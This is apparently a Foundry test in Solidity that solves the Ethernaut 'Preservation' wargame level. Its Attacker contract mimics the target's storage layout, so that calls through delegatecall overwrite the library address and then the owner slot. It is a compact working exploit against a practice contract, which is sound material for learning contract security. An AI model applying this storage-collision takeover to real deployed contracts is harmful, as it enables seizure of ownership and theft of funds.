// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Preservation, LibraryContract} from "../src/level16/Preservation.sol";

contract Attacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 time) public {
        owner = address(uint160(time));
    }
}

contract TestContract is Test {
    Preservation public level;
    LibraryContract public timeZone1Library1;
    LibraryContract public timeZone1Library2;
    Attacker public attacker;

    function setUp() public {
        timeZone1Library1 = new LibraryContract();
        timeZone1Library2 = new LibraryContract();

        level = new Preservation(
            address(timeZone1Library1),
            address(timeZone1Library2)
        );
        attacker = new Attacker();
    }

    function test_attack() public {
        assertEq(level.owner(), address(this));

        address player = vm.addr(1);
        vm.startPrank(player);
        
        level.setFirstTime(uint256(uint160(address(attacker))));

        level.setFirstTime(uint256(uint160(address(player))));

        assertEq(level.owner(), player);

        vm.stopPrank();
    }
}
